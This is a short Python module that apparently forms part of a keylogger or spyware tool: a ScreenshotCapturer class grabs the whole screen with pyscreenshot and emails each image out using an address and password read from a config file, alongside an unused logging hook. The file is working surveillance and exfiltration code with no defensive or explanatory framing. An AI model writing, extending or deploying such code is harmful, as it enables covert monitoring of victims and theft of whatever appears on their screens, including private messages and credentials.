# screenshot_capturer.py
import pyscreenshot
from config import EMAIL_ADDRESS, EMAIL_PASSWORD
from utils import send_mail

class ScreenshotCapturer:
    def __init__(self, append_log):
        self.append_log = append_log

    def capture(self):
        img = pyscreenshot.grab()
        send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
